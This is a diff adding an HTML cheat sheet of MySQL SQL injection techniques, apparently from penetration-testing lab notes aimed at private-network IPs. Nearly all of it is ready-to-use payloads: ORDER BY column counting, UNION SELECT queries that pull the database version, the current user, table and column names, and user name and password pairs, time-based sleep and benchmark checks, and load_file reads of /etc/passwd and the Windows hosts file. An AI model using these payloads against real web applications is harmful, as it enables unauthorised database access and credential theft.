@@ -1,0 +1,76 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Data extraction</title>
+</head><body><b>MYSQL version<br/>
+</b><br/>
+Injecting the following string causes the WHERE clause of a SELECT statement to be false if the MySQL version in use is greater than or equal to 3.23.02.<b><br/>
+</b><tt>/*!32302 and 1=0*/</tt><b><br/>
+</b>Using UNION<br/>
+AAA<tt>' UNION SELECT @@version,NULL,NULL--</tt><b><br/>
+</b><b><br/>
+Test for column count (assuming id is number parameter)<br/>
+</b><tt><br/>
+</tt><tt>http://10.11.13.67/comment.php?id=123</tt>order by 1<br/>
+<tt>http://10.11.13.67/comment.php?id=123</tt>order by 2<br/>
+<tt>http://10.11.13.67/comment.php?id=123</tt>order by 3<br/>
+.<br/>
+.<br/>
+<tt>http://10.11.13.67/comment.php?id=123</tt>order by 5<br/>
+<tt>http://10.11.13.67/comment.php?id=123</tt>order by 6 &gt;&gt;&gt; error &gt;&gt;&gt; the table has 5 columns<br/>
+<br/>
+<b>Discover output layout (assuming id is number parameter)<br/>
+</b><br/>
+UNION removes duplicates<br/>
+UNION ALL doesn't remove duplicates<b><br/>
+</b>use the discovered columns count<b><br/>
+</b>search for display of 1,2,...,6 on the page<b><br/>
+</b><tt>http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,5,6</tt><br/>
+<br/>
+<b>Extracting data (assuming id is number parameter)</b><tt><br/>
+</tt><br/>
+Output concatenation<tt><br/>
+</tt><tt>SELECT CONCAT(table_name,':',column_name) from information_schema.columns</tt><br/>
+<br/>
+db version<br/>
+<tt>http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,@@version,6</tt><br/>
+<br/>
+current user being used for db connection<br/>
+<tt>http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,user(),6<br/>
+select if(user() like 'root@%', sleep(5000), 'false')<br/>
+</tt>MYSQL&lt;=5.0.12<tt><br/>
+</tt><tt>select if(user() like 'root@%', benchmark(50000,sha1('test')), 'false')<br/>
+</tt><br/>
+db tables<br/>
+<tt>http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,table_name,6 FROM information_schema.tables<br/>
+</tt><br/>
+display column names of table <i>users<br/>
+</i><tt>http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'<br/>
+</tt><br/>
+extracting data from users table<br/>
+<tt>http://10.11.1.35/comment.php?id=738 union select 1,2,3,4,concat(name,0x3a, password),6 FROM users<br/>
+<br/>
+</tt>display table names and column names<br/>
+<tt>AAA'%20union%20select%20table_name,column_name,null,null,null%20from%20information_schema.columns--<br/>
+<br/>
+</tt>Find table with column name containing PASS<br/>
+<tt>SELECT table_name,column_name FROM information_schema.columns where column_name LIKE '%PASS%'<br/>
+<br/>
+</tt><b>Reading files (assuming id is number parameter, single quotes CAN be bypassed)<br/>
+</b><tt><br/>
+http://10.11.1.35/comment.php?id=738 union select 1,2,3,4,load_file('c:/windows/system32/drivers/etc/hosts'),6<br/>
+</tt>SELECT<tt>load_file('/etc/passwd')<br/>
+</tt><tt><br/>
+</tt><b>INFORMATION_SCHEMA table structure</b><br/>
+<br/>
+SCHEMATA			All databases the user has (at least) SELECT_priv<br/>
+SCHEMA_PRIVILEGES	The privileges the user has for each DB<br/>
+TABLES				All tables the user has (at least) SELECT_priv<br/>
+TABLE_PRIVILEGES		The privileges the user has for each table<br/>
+COLUMNS			All columns the user has (at least) SELECT_priv<br/>
+COLUMN_PRIVILEGES	The privileges the user has for each column<br/>
+VIEWS				All columns the user has (at least) SELECT_priv<br/>
+ROUTINES			Procedures and functions (needs EXECUTE_priv)<br/>
+TRIGGERS			Triggers (needs INSERT_priv)<br/>
+USER_PRIVILEGES		Privileges connected User has<br/>
+</body></html>
